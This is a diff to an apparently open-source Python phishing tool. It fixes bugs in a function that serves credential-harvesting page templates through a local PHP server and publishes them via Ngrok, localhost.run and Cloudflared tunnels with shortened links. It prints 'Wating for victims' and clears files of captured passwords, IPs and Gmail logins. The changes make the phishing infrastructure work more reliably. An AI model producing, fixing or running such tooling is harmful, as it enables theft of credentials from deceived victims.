@@ -424,8 +424,8 @@ def phish(template):
     print(f"""
 
     {C} Template : {G} {template}
-    {C} Server   : {G} Ngrok ,Localhost.run , CloudFlared
-        {C} Port     : {G} {port}
+    {C} Server   : {G} Ngrok , Localhost.run , CloudFlared
+    {C} Port     : {G} {port}
     
     {B}       STARTING SERVERS
 {G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
@@ -453,7 +453,7 @@ def phish(template):
         print(f"\n{R}CLOUDFLARED LINK DEPLOY FAILED")
     else:
         print(f"\n{C} CLOUDFLARED LINK = {Y} {link3}")
-        print(f"{C} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
+        print(f"{C} LINK STATUS CODE = {W}[{G}{requests.get(link3).status_code}{W}] ")
         print(f"{C} SHORT LINK = {Y} {short(link3)}")
         print()
     print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
@@ -485,7 +485,7 @@ def phish(template):
 def startServicea(folder,port):
     import os
     os.chdir(folder)
-    os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2&>1")
+    os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2>&1")
     
 
     code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
@@ -500,14 +500,14 @@ def startServicea(folder,port):
     except Exception as e:
         link = ""
         pass
-    command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\.lhr.life" && rm ok.txt"""
+    command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\" && rm ok.txt"""
     try:
         oo = subprocess.check_output(command,shell=True)
         link2 = (str(oo.decode())[:-1])
     except Exception as e:
         link2 = ""
 
-    command2 = f"""rm ~/cld.log > /dev/null 2>&1 &&  cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &  
+    command2 = f"""cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &  
     sleep 10 && grep -o "https://[-0-9a-z]*\.trycloudflare.com" ~/cld.log"""
     try:
         
